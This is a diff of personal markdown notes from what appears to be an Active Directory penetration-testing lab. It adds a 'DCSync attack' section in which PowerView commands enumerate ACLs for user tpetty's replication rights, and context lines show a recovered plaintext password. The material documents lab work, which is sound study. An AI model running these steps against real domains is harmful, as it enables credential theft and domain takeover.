@@ -1,5 +1,9 @@
 # AD
 
+## Tools&#x20;
+
+
+
 ## Nmap
 
 ```
@@ -165,4 +169,17 @@ lsadump::secrets
 ```
 
 And the password for the user tpetty is Sup3rS3cur3D0m@inU2eR
+
+### DCSync attack
+
+Using the information provided in the **ACL Enumeration** module, we can determine that the `tpetty`username.
+
+```
+Import-Module .\PowerView.ps1
+
+$tpettysid = Convert-NameToSid tpetty
+Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $tpettysid} -Verbose
+```
+
+And we detect that the **ObjectAce** Type are: **DS-Replication-Get-Changes-In-Filtered-Set** and **DS-Replication-Get-Changes**&#x20;
 
